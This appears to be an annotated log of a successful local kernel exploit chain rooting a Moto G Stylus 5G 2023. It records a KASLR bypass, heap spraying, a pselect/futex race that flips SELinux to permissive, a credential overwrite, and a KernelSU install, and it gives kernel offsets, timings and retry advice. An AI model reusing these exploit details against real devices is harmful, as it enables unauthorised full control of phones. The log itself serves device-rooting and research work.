# Final Run — First Successful Root

Annotated log of the first clean W1 → W2 → KernelSU chain after both bug
fixes were applied. This was attempt 1, first try after reboot.

## Environment

- Moto G Stylus 5G 2023, serial ZY22HNRQNZ
- WiFi off, airplane mode on
- 60-second settle time after boot before exploit launch
- USB debugging via adb

## Annotated log

```
[*] kernel: 5.10.240-android12-9-00006-g25161a557b20-ab14744618
[+] offsets matched: 5.10.240-android12-9-00006-g25161a557b20-ab14744618
```
Kernel version detected, device-specific offsets loaded from `genevn/offsets.h`.

```
[*] init_cred image=ffffffc00a7c0a60 alias=ffffff802a7c0a60
[*] kphys_load=0xa8000000 phys_offset=0x80000000 page_offset=0xffffff8000000000
```
Both KIMAGE and direct-map aliases computed. After Bug #1, the exploit uses
the KIMAGE alias (`ffffffc00a7c0a60`) for W2, not the direct-map
(`ffffff802a7c0a60`).

```
[+] startup context pid=6676 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[+] startup limits pid=6676 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
```
Running as adb shell (uid 2000). SELinux enforcing. No seccomp — good, we
need `perf_event_open` and `futex`.

```
[*] [T+0ms] exploit start
[*] kaslr detect: collected 1024 kernel IPs
[*] kaslr detect: densest 4KB window: 842 IPs at [0xffffffe579c01e9c..0xffffffe579c02be8]
[+] kaslr detect: base=0xffffffe579200000 slide=0x2571200000
[+] KASLR: base=0xffffffe579200000 slide=0x2571200000
```
KASLR defeated in 3 seconds. 842/1024 IPs clustered in `__schedule` — strong
signal. Slide = `0x2571200000`.

```
[*] [T+3037ms] pre-W1 drain
[*] Write 1 attempt 1/5
[*] W1 target: 0xffffffe57bc52b90 (KIMAGE via KASLR slide) selinux_state
[*] === W1: SELinux === target=0xffffffe57bc52b90 mode=1
```
W1 begins. Target: `selinux_state` at base + slide + `0x02A52B90`.

```
[*] [T+3037ms]   heap spray start
[*] pagemap: round 0, forking 512 saturate children (total=0)...
[*] pagemap: spray 1260/1280 sends
[*] [T+4906ms]   heap spray done
```
Heap spray via UDP skb. 1260 of 1280 spray packets landed (~98.4%).

```
[*] SELINUX PRE-pselect: enforce=1
[*] pselect pre-select +6ms timeout=5.000s
[*] pselect post-select +57ms ret=6 errno=0
[*] SELINUX CHECK after pselect: enforce=0
[+] W1 success — SELinux permissive
```
**W1 landed in 57ms.** The pselect/futex race triggered the ghost write —
`selinux_state.enforcing` overwritten from 1 → 0. SELinux is now permissive.

```
[*] UMH not available, falling back to W2 cred path
[*] [T+15127ms] pre-W2 drain
[*] child_pid=15744 child_task=0xffffff8826fb5c80
```
No `ashmem_misc_fops` on this device, so UMH path unavailable. Falling back
to direct W2 credential overwrite. Child task located in kernel memory.

```
[*] round 1/10: cred write
[*] === W2: cred === target=0xffffff8826fb6400 mode=2
[*] [T+18806ms]   heap spray start
[*] W2 init_cred KIMAGE: fake_right=0xffffffe57b9c0a60 off=0x27c0a60
```
W2 begins. `fake_right` uses KIMAGE mapping (Bug #1 fix). Target: child's
`cred` pointer at `task_struct + 0x780`.

```
[*] pagemap: spray 1260/1280 sends
[*] [T+20836ms]   heap spray done
[*] SELINUX PRE-pselect: enforce=0
[*] pselect pre-select +7ms timeout=5.000s
[*] pselect post-select +58ms ret=8 errno=0
[*] SELINUX CHECK after pselect: enforce=0
```
**W2 landed in 58ms. No crash.** The Phase 2 pi_tree `RB_EMPTY_NODE` was
preserved through the pselect overlay (Bug #2 fix), preventing the destructive
second rb_erase.

```
[+] child is root!
[+] root shell pid=22233 uid=0
```
Child process detected `uid=0`. Grandchild forked with clean credentials.

```
[*] uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0 enforce=1
[+] KernelSU ready
```
**Full root achieved.** KernelSU module loaded via `finit_module` (80+
non-exported symbols resolved by `ko_loader.h`), `ksud install` completed.
SELinux re-enabled in enforcing mode. Context shows `u:r:ksu:s0` — KernelSU's
SELinux domain.

## Timing summary

| Phase | Wall clock | Duration |
|---|---|---|
| KASLR detection | T+0 → T+3037ms | 3.0s |
| W1 heap spray | T+3037 → T+4906ms | 1.9s |
| W1 pselect race | T+4906 → T+4963ms | 57ms |
| W2 heap spray | T+18806 → T+20836ms | 2.0s |
| W2 pselect race | T+20836 → T+20894ms | 58ms |
| **Total exploit** | T+0 → ~T+21s | **~21s** |

The gaps between phases include drain cycles and child process setup.

## Success rate

Over the debugging sessions: roughly 1-in-2 per boot with both fixes applied.
If it doesn't land, reboot and retry — 1–3 boots is typical.
